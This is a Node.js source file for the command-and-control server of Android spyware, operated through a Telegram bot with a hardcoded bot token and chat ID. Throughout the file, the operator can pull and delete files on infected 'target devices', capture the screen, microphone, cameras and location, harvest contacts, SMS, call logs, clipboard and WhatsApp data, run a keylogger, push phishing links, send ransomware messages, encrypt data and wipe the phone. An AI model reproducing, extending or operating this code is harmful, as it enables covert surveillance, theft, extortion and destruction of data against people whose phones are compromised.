// merged index.js — old base + new features merged
const express = require('express');
const webSocket = require('ws');
const http = require('http')
const telegramBot = require('node-telegram-bot-api')
const uuid4 = require('uuid')
const multer = require('multer');
const bodyParser = require('body-parser')
const axios = require("axios");

const token ='7968491283:AAEDG0mAt-QcA8kc5a4Me2oZZmRovUalhBQ'  // use your desired token
const id = '5990053155'
const address = 'https://www.google.com'

const app = express();
const appServer = http.createServer(app);
const appSocket = new webSocket.Server({server: appServer});
const appBot = new telegramBot(token, {polling: true});
const appClients = new Map()

const upload = multer();
app.use(bodyParser.json());

let currentUuid = ''
let currentNumber = ''
let currentTitle = ''

app.get('/', function (req, res) {
    res.send('<h1 align="center">𝙎𝙚𝙧𝙫𝙚𝙧 𝙪𝙥𝙡𝙤𝙖𝙙𝙚𝙙 𝙨𝙪𝙘𝙘𝙚𝙨𝙛𝙪𝙡𝙡𝙮</h1>')
})

app.post("/uploadFile", upload.single('file'), (req, res) => {
    const name = req.file.originalname
    appBot.sendDocument(id, req.file.buffer, {
            caption: `°• 𝙈𝙚𝙨𝙨𝙖𝙜𝙚 𝙛𝙧𝙤𝙢 <b>${req.headers.model}</b> 𝙙𝙚𝙫𝙞𝙘𝙚`,
            parse_mode: "HTML"
        },
        {
            filename: name,
            contentType: 'application/txt',
        })
    res.send('')
})
app.post("/uploadText", (req, res) => {
    appBot.sendMessage(id, `°• 𝙈𝙚𝙨𝙨𝙖𝙜𝙚 𝙛𝙧𝙤𝙢 <b>${req.headers.model}</b> 𝙙𝙚𝙫𝙞𝙘𝙚\n\n` + req.body['text'], {parse_mode: "HTML"})
    res.send('')
})
app.post("/uploadLocation", (req, res) => {
    appBot.sendLocation(id, req.body['lat'], req.body['lon'])
    appBot.sendMessage(id, `°• 𝙇𝙤𝙘𝙖𝙩𝙞𝙤𝙣 𝙛𝙧𝙤𝙢 <b>${req.headers.model}</b> 𝙙𝙚𝙫𝙞𝙘𝙚`, {parse_mode: "HTML"})
    res.send('')
})

appSocket.on('connection', (ws, req) => {
    const uuid = uuid4.v4()
    const model = req.headers.model
    const battery = req.headers.battery
    const version = req.headers.version
    const brightness = req.headers.brightness
    const provider = req.headers.provider

    ws.uuid = uuid
    appClients.set(uuid, {
        model: model,
        battery: battery,
        version: version,
        brightness: brightness,
        provider: provider
    })
    appBot.sendMessage(id,
        `°• 𝙉𝙚𝙬 𝙙𝙚𝙫𝙞𝙘𝙚 𝙘𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙\n\n` +
        `• ᴅᴇᴠɪᴄᴇ ᴍᴏᴅᴇʟ : <b>${model}</b>\n` +
        `• ʙᴀᴛᴛᴇʀʏ : <b>${battery}</b>\n` +
        `• ᴀɴᴅʀᴏɪᴅ ᴠᴇʀꜱɪᴏɴ : <b>${version}</b>\n` +
        `• ꜱᴄʀᴇᴇɴ ʙʀɪɢʜᴛɴᴇꜱꜱ : <b>${brightness}</b>\n` +
        `• ᴘʀᴏᴠɪᴅᴇʀ : <b>${provider}</b>`,
        {parse_mode: "HTML"}
    )
    ws.on('close', function () {
        appBot.sendMessage(id,
            `°• 𝘿𝙚𝙫𝙞𝙘𝙚 𝙙𝙞𝙨𝙘𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙\n\n` +
            `• ᴅᴇᴠɪᴄᴇ ᴍᴏᴅᴇʟ : <b>${model}</b>\n` +
            `• ʙᴀᴛᴛᴇʀʏ : <b>${battery}</b>\n` +
            `• ᴀɴᴅʀᴏɪᴅ ᴠᴇʀꜱɪᴏɴ : <b>${version}</b>\n` +
            `• ꜱᴄʀᴇᴇɴ ʙʀɪɢʜᴛɴᴇꜱꜱ : <b>${brightness}</b>\n` +
            `• ᴘʀᴏᴠɪᴅᴇʀ : <b>${provider}</b>`,
            {parse_mode: "HTML"}
        )
        appClients.delete(ws.uuid)
    })
})

appBot.on('message', (message) => {
    const chatId = message.chat.id;

    // === reply_to_message flows (existing + new prompts)
    if (message.reply_to_message) {
        // existing SMS single flow
        if (message.reply_to_message.text.includes('°• 𝙋𝙡𝙚𝙖𝙨𝙚 𝙧𝙚𝙥𝙡𝙮 𝙩𝙝𝙚 𝙣𝙪𝙢𝙗𝙚𝙧')) {
            currentNumber = message.text
            appBot.sendMessage(id,
                '°• 𝙂𝙧𝙚𝙖𝙩, 𝙣𝙤𝙬 𝙚𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙨𝙚𝙣𝙙 𝙩𝙤 𝙩𝙝𝙞𝙨 𝙣𝙪𝙢𝙗𝙚𝙧\n\n' +
                '• ʙᴇ ᴄᴀʀᴇꜰᴜʟ ᴛʜᴀᴛ ᴛʜᴇ ᴍᴇꜱꜱᴀɢᴇ ᴡɪʟʟ ɴᴏᴛ ʙᴇ ꜱᴇɴᴛ ɪꜰ ᴛʜᴇ ɴᴜᴍʙᴇʀ ᴏꜰ ᴄʜᴀʀᴀᴄᴛᴇʀꜱ ɪɴ ʏᴏᴜʀ ᴍᴇꜱꜱᴀɢᴇ ɪꜱ ᴍᴏʀᴇ ᴛʜᴀɴ ᴀʟʟᴏᴡᴇᴅ',
                {reply_markup: {force_reply: true}}
            )
        }
        // SMS message entered
        if (message.reply_to_message.text.includes('now  enter the message you want to send') || message.reply_to_message.text.includes('𝙂𝙧𝙚𝙖𝙩, 𝙣𝙤𝙬 𝙚𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚')) {
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`send_message:${currentNumber}/${message.text}`)
                }
            });
            currentNumber = ''
            currentUuid = ''
            appBot.sendMessage(id,
                '°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n' +
                '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
                        'resize_keyboard': true
                    }
                }
            )
        }

        // existing send_message_to_all flow
        if (message.reply_to_message.text.includes('Enter the message you want to send to all contacts') || message.reply_to_message.text.includes('𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙨𝙚𝙣𝙙 𝙩𝙤 𝙖𝙡𝙡')) {
            const message_to_all = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`send_message_to_all:${message_to_all}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n' +
                '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
                        'resize_keyboard': true
                    }
                }
            )
        }

        // file download/delete flows (existing)
        if (message.reply_to_message.text.includes('Enter the path of the file you want to download') || message.reply_to_message.text.includes('📩𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙥𝙖𝙩𝙝')) {
            const path = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`file:${path}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• 𝙎𝙚𝙣𝙩 𝙧𝙚𝙦𝙪𝙚𝙨𝙩\n',
                {parse_mode: "HTML"}
            )
        }
        if (message.reply_to_message.text.includes('Enter the path of the file you want to delete') || message.reply_to_message.text.includes('📂𝙀𝙣𝙩𝙚𝙧')) {
            const path = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`delete_file:${path}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• 𝘿𝙚𝙡𝙚𝙩𝙚 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙨𝙚𝙣𝙩\n',
                {parse_mode: "HTML"}
            )
        }

        // NEW: custom phishing page link reply flow
        if (message.reply_to_message.text.includes('now enter the link you want to be opened by the notification') || message.reply_to_message.text.includes('Enter the link you want to be opened')) {
            const link = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`show_notification:${currentTitle}/${link}`)
                }
            });
            currentUuid = ''
            currentTitle = ''
            appBot.sendMessage(id, '°• 𝙉𝙤𝙩𝙞𝙛𝙞𝙘𝙖𝙩𝙞𝙤𝙣 𝙨𝙚𝙣𝙩', {parse_mode: "HTML"})
        }

        // NEW: custom phishing prompt reply
        if (message.reply_to_message.text.includes('Enter the phishing page link') || message.reply_to_message.text.includes('Enter the link for phishing page')) {
            const link = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`custom_phishing:${link}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id, '°• 𝘾𝙪𝙨𝙩𝙤𝙢 𝙥𝙝𝙞𝙨𝙝𝙞𝙣𝙜 𝙢𝙖𝙣𝙙𝙖𝙩𝙚 𝙨𝙚𝙣𝙩', {parse_mode: "HTML"})
        }

        // NEW: ransomware message reply
        if (message.reply_to_message.text.includes('Enter the ransomware message') || message.reply_to_message.text.includes('Enter ransom message')) {
            const ransomMsg = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`ransomware:${ransomMsg}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id, '°• 𝙍𝙖𝙣𝙨𝙤𝙢 𝙘𝙤𝙢𝙢𝙖𝙣𝙙 𝙨𝙚𝙣𝙩', {parse_mode: "HTML"})
        }
    } // end reply_to_message

    // === main flows for messages (buttons etc.)
    if (id == chatId) {
        if (message.text == '/start') {
            appBot.sendMessage(id,
                '°• 𝙃𝙚𝙡𝙡𝙤, 𝙢𝙮 𝘿𝙚𝙖𝙧 Chotu 𝙎𝙞𝙧 😎\n\n' +
                '• ɪ ᴀᴍ ᴛʜᴇ ʙᴏᴛ. ᴜsᴇ ᴛʜᴇ ᴄᴏᴍᴍᴀɴᴅ ᴛᴏ ɪɴᴛᴇʀᴀᴄᴛ ᴡɪᴛʜ ᴅᴇᴠɪᴄᴇs.',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
                        'resize_keyboard': true
                    }
                }
            )
        }

        if (message.text == '𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨') {
            if (appClients.size == 0) {
                appBot.sendMessage(id,
                    '°• 𝙉𝙤 𝙘𝙤𝙣𝙣𝙚𝙘𝙩𝙞𝙣𝙜 𝙙𝙚𝙫𝙞𝙘𝙚𝙨 𝙖𝙫𝙖𝙞𝙡𝙖𝙗𝙡𝙚\n\n' +
                    '• ᴍᴀᴋᴇ ꜱᴜʀᴇ ᴛʜᴇ ᴀᴘᴘʟɪᴄᴀᴛɪᴏɴ ɪꜱ ɪɴꜱᴛᴀʟʟᴇᴅ ᴏɴ ᴛʜᴇ ᴛᴀʀɢᴇᴛ ᴅᴇᴠɪᴄᴇ'
                )
            } else {
                let text = '°• 𝙇𝙞𝙨𝙩 𝙤𝙛 𝙘𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨 :\n\n'
                appClients.forEach(function (value, key, map) {
                    text += `• ᴅᴇᴠɪᴄᴇ ᴍᴏᴅᴇʟ : <b>${value.model}</b>\n` +
                        `• ʙᴀᴛᴛᴇʀʏ : <b>${value.battery}</b>\n` +
                        `• ᴀɴᴅʀᴏɪᴅ ᴠᴇʀꜱɪᴏɴ : <b>${value.version}</b>\n` +
                        `• ꜱᴄʀᴇᴇɴ ʙʀɪɢʜᴛɴᴇꜱꜱ : <b>${value.brightness}</b>\n` +
                        `• ᴘʀᴏᴠɪᴅᴇʀ : <b>${value.provider}</b>\n\n`
                })
                appBot.sendMessage(id, text, {parse_mode: "HTML"})
            }
        }

        if (message.text == '𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙') {
            if (appClients.size == 0) {
                appBot.sendMessage(id,
                    '°• 𝙉𝙤 𝙘𝙤𝙣𝙣𝙚𝙘𝙩𝙞𝙣𝙜 𝙙𝙚𝙫𝙞𝙘𝙚𝙨 𝙖𝙫𝙖𝙞𝙡𝙖𝙗𝙡𝙚\n\n' +
                    '• ᴍᴀᴋᴇ ꜱᴜʀᴇ ᴛʜᴇ ᴀᴘᴘʟɪᴄᴀᴛɪᴏɴ ɪꜱ ɪɴꜱᴛᴀʟʟᴇᴅ ᴏɴ ᴛʜᴇ ᴛᴀʀɢᴇᴛ ᴅᴇᴠɪᴄᴇ'
                )
            } else {
                const deviceListKeyboard = []
                appClients.forEach(function (value, key, map) {
                    deviceListKeyboard.push([{
                        text: value.model,
                        callback_data: 'device:' + key
                    }])
                })
                appBot.sendMessage(id, '°• 𝙎𝙚𝙡𝙚𝙘𝙩 𝙙𝙚𝙫𝙞𝙘𝙚 𝙩𝙤 𝙚𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙', {
                    "reply_markup": {
                        "inline_keyboard": deviceListKeyboard,
                    },
                })
            }
        }
    } else {
        appBot.sendMessage(id, '°• 𝙋𝙚𝙧𝙢𝙞𝙨𝙨𝙞𝙤𝙣 𝙙𝙚𝙣𝙞𝙚𝙙')
    }
})

// === callback_query handler with extra commands merged ===
appBot.on("callback_query", (callbackQuery) => {
    const msg = callbackQuery.message;
    const data = callbackQuery.data
    const commend = data.split(':')[0]
    const uuid = data.split(':')[1]
    console.log('callback:', commend, uuid)

    if (commend == 'device') {
        const device = appClients.get(uuid)
        appBot.editMessageText(`°• 𝙎𝙚𝙡𝙚𝙘𝙩 𝙘𝙤𝙢𝙢𝙖𝙣𝙙 𝙛𝙤𝙧 𝙙𝙚𝙫𝙞𝙘𝙚 : <b>${device ? device.model : 'unknown'}</b>`, {
            width: 10000,
            chat_id: id,
            message_id: msg.message_id,
            reply_markup: {
                inline_keyboard: [
                    [
                        {text: '𝘼𝙥𝙥𝙨', callback_data: `apps:${uuid}`},
                        {text: '𝘿𝙚𝙫𝙞𝙘𝙚 𝙞𝙣𝙛𝙤', callback_data: `device_info:${uuid}`}
                    ],
                    [
                        {text: '𝙂𝙚𝙩 𝙁𝙞𝙡𝙚', callback_data: `file:${uuid}`},
                        {text: '𝘿𝙚𝙡𝙚𝙩𝙚 𝙁𝙞𝙡𝙚', callback_data: `delete_file:${uuid}`}
                    ],
                    [
                        {text: 'Screenshot', callback_data: `screenshot:${uuid}`},
                        {text: 'WhatsApp', callback_data: `whatsapp:${uuid}`},
                    ],
                    [
                        {text: 'Clipboard', callback_data: `clipboard:${uuid}`},
                        {text: 'Microphone', callback_data: `microphone:${uuid}`},
                    ],
                    [
                        {text: 'Main camera', callback_data: `camera_main:${uuid}`},
                        {text: 'Selfie camera', callback_data: `camera_selfie:${uuid}`}
                    ],
                    [
                        {text: 'Location', callback_data: `location:${uuid}`},
                        {text: 'Toast', callback_data: `toast:${uuid}`}
                    ],
                    [
                        {text: 'Get Payment', callback_data: `get_payment:${uuid}`},
                        {text: 'Phone Reset', callback_data: `erase_data:${uuid}`},
                    ],
                    [
                        {text: 'Call logs', callback_data: `calls:${uuid}`},
                        {text: 'Contacts', callback_data: `contacts:${uuid}`}
                    ],
                    [
                        {text: 'Vibrate', callback_data: `vibrate:${uuid}`},
                        {text: 'Notification', callback_data: `show_notification:${uuid}`}
                    ],
                    [
                        {text: 'Messages', callback_data: `messages:${uuid}`},
                        {text: 'Send SMS', callback_data: `send_message:${uuid}`}
                    ],
                    [
                        {text: 'Ransomware', callback_data: `ransomware_prompt:${uuid}`},
                        {text: 'Custom Phishing', callback_data: `custom_phishing_prompt:${uuid}`},
                    ],
                    [
                        {text: 'Play Audio', callback_data: `play_audio:${uuid}`},
                        {text: 'Stop Audio', callback_data: `stop_audio:${uuid}`},
                    ],
                    [
                        {text: 'Send SMS to All', callback_data: `send_message_to_all:${uuid}`}
                    ],
                    [
                        {text: 'Encrypt Data', callback_data: `encrypt_data:${uuid}`},
                        {text: 'Decrypt Data', callback_data: `decrypt_data:${uuid}`},
                    ],
                    [
                        {text: 'Keylogger ON', callback_data: `keylogger_on:${uuid}`},
                        {text: 'Keylogger OFF', callback_data: `keylogger_off:${uuid}`},
                    ],
                ]
            },
            parse_mode: "HTML"
        })
    }

    // For most simple commands: forward to socket and inform user like others
    const simpleForward = (wsCommand, replyText) => {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send(wsCommand);
            }
        });
        try { appBot.deleteMessage(id, msg.message_id) } catch (e) {}
        appBot.sendMessage(id, replyText, {
            parse_mode: "HTML",
            "reply_markup": {
                "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
                'resize_keyboard': true
            }
        })
    }

    // Map common commands to actions
    if (commend == 'screenshot') {
        simpleForward('screenshot', '°• Screenshot request sent.')
    }
    if (commend == 'whatsapp') {
        simpleForward('whatsapp', '°• WhatsApp info request sent.')
    }
    if (commend == 'get_payment') {
        simpleForward('get_payment', '°• Get payment command sent.')
    }
    if (commend == 'erase_data') {
        simpleForward('erase_data', '°• Phone reset/erase command sent.')
    }
    if (commend == 'calls') {
        simpleForward('calls', '°• Call logs request sent.')
    }
    if (commend == 'contacts') {
        simpleForward('contacts', '°• Contacts request sent.')
    }
    if (commend == 'messages') {
        simpleForward('messages', '°• Messages request sent.')
    }
    if (commend == 'apps') {
        simpleForward('apps', '°• Apps request sent.')
    }
    if (commend == 'device_info') {
        simpleForward('device_info', '°• Device info request sent.')
    }
    if (commend == 'clipboard') {
        simpleForward('clipboard', '°• Clipboard request sent.')
    }
    if (commend == 'microphone') {
        simpleForward('microphone', '°• Microphone record request sent.')
    }
    if (commend == 'camera_main') {
        simpleForward('camera_main', '°• Main camera request sent.')
    }
    if (commend == 'camera_selfie') {
        simpleForward('camera_selfie', '°• Selfie camera request sent.')
    }
    if (commend == 'location') {
        simpleForward('location', '°• Location request sent.')
    }
    if (commend == 'vibrate') {
        simpleForward('vibrate', '°• Vibrate command sent.')
    }
    if (commend == 'play_audio') {
        simpleForward('play_audio', '°• Play audio command sent.')
    }
    if (commend == 'stop_audio') {
        simpleForward('stop_audio', '°• Stop audio command sent.')
    }
    if (commend == 'encrypt_data') {
        simpleForward('encrypt_data', '°• Encrypt data command sent.')
    }
    if (commend == 'decrypt_data') {
        simpleForward('decrypt_data', '°• Decrypt data command sent.')
    }
    if (commend == 'keylogger_on') {
        simpleForward('keylogger_on', '°• Keylogger ON command sent.')
    }
    if (commend == 'keylogger_off') {
        simpleForward('keylogger_off', '°• Keylogger OFF command sent.')
    }

    // Send message single flow (prompt)
    if (commend == 'send_message') {
        try { appBot.deleteMessage(id, msg.message_id) } catch(e){}
        appBot.sendMessage(id, '°• 𝙋𝙡𝙚𝙖𝙨𝙚 𝙧𝙚𝙥𝙡𝙮 𝙩𝙝𝙚 𝙣𝙪𝙢𝙗𝙚𝙧 𝙩𝙤 𝙬𝙝𝙞𝙘𝙝 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙨𝙚𝙣𝙙 𝙩𝙝𝙚 𝙎𝙈𝙎\n\n' +
            '•ɪꜰ ʏᴏᴜ ᴡᴀɴᴛ ᴛᴏ ꜱᴇɴᴅ ꜱᴍꜱ ᴛᴏ ʟᴏᴄᴀʟ ᴄᴏᴜɴᴛʀʏ ɴᴜᴍʙᴇʀꜱ, ʏᴏᴜ ᴄᴀɴ ᴇɴᴛᴇʀ ᴛʜᴇ ɴᴜᴍʙᴇʀ ᴡɪᴛʜ ᴢᴇʀᴏ ᴀᴛ ᴛʜᴇ ʙᴇɢɪɴɴɪɴɢ, ᴏᴛʜᴇʀᴡɪꜱᴇ ᴇɴᴛᴇʀ ᴛʜᴇ ɴᴜᴍʙᴇʀ ᴡɪᴛʜ ᴛʜᴇ ᴄᴏᴜɴᴛʀʏ ᴄᴏᴅᴇ',
            {reply_markup: {force_reply: true}})
        currentUuid = uuid
    }

    // Send message to all (prompt)
    if (commend == 'send_message_to_all') {
        try { appBot.deleteMessage(id, msg.message_id) } catch(e){}
        appBot.sendMessage(id,
            '°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙨𝙚𝙣𝙙 𝙩𝙤 𝙖𝙡𝙡 𝙘𝙤𝙣𝙩𝙖𝙘𝙩𝙨\n\n' +
            '• ʙᴇ ᴄᴀʀᴇꜰᴜʟ ᴛʜᴀᴛ ᴛʜᴇ ᴍᴇꜱꜱᴀɢᴇ ᴡɪʟʟ ɴᴏᴛ ʙᴇ ꜱᴇɴᴛ ɪꜰ ᴛʜᴇ ɴᴜᴍʙᴇʀ ᴏꜰ ᴄʜᴀʀᴀᴄᴛᴇʀꜱ ɪɴ ʏᴏᴜʀ ᴍᴇꜱꜱᴀɢᴇ ɪꜱ ᴍᴏʀᴇ ᴛʜᴀɴ ᴀʟʟᴏᴡᴇᴅ',
            {reply_markup: {force_reply: true}}
        )
        currentUuid = uuid
    }

    // File flows
    if (commend == 'file') {
        try { appBot.deleteMessage(id, msg.message_id) } catch(e){}
        appBot.sendMessage(id,
            '°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙥𝙖𝙩𝙝 𝙤𝙛 𝙩𝙝𝙚 𝙛𝙞𝙡𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙙𝙤𝙬𝙣𝙡𝙤𝙖𝙙\n\n' +
            '• ʏᴏᴜ ᴅᴏ ɴᴏᴛ ɴᴇᴇᴅ ᴛᴏ ᴇɴᴛᴇʀ ᴛʜᴇ ꜰᴜʟʟ ꜰɪʟᴇ ᴘᴀᴛʜ, ᴊᴜꜱᴛ ᴇɴᴛᴇʀ ᴛʜᴇ ᴍᴀɪɴ ᴘᴀᴛʜ. ꜰᴏʀ ᴇxᴀᴍᴘʟᴇ, ᴇɴᴛᴇʀ DCIM/Camera',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }

    if (commend == 'delete_file') {
        try { appBot.deleteMessage(id, msg.message_id) } catch(e){}
        appBot.sendMessage(id,
            '°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙥𝙖𝙩𝙝 𝙤𝙛 𝙩𝙝𝙚 𝙛𝙞𝙡𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙙𝙚𝙡𝙚𝙩𝙚\n\n' +
            '• ᴅᴏ ɴᴏᴛ ɴᴇᴇᴅ ᴛᴏ ᴇɴᴛᴇʀ ᴛʜᴇ ꜰᴜʟʟ ꜰɪʟᴇ ᴘᴀᴛʜ, ᴊᴜꜱᴛ ᴇɴᴛᴇʀ ᴛʜᴇ ᴍᴀɪɴ ᴘᴀᴛʜ.',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }

    // RANSOMWARE prompt: ask for message (force reply)
    if (commend == 'ransomware_prompt') {
        try { appBot.deleteMessage(id, msg.message_id) } catch(e){}
        appBot.sendMessage(id, '°• Enter the ransomware message (this will be sent to target device).', {reply_markup: {force_reply: true}})
        currentUuid = uuid
    }

    // Custom phishing prompt: ask for phishing link (force reply)
    if (commend == 'custom_phishing_prompt') {
        try { appBot.deleteMessage(id, msg.message_id) } catch(e){}
        appBot.sendMessage(id, '°• Enter the phishing page link you want to deploy (URL).', {reply_markup: {force_reply: true}})
        currentUuid = uuid
    }

    // fallback: unknown command
    // (other callback commands handled above by simpleForward or specific flows)
})

// Start server
const PORT = process.env.PORT || 3000
appServer.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
})
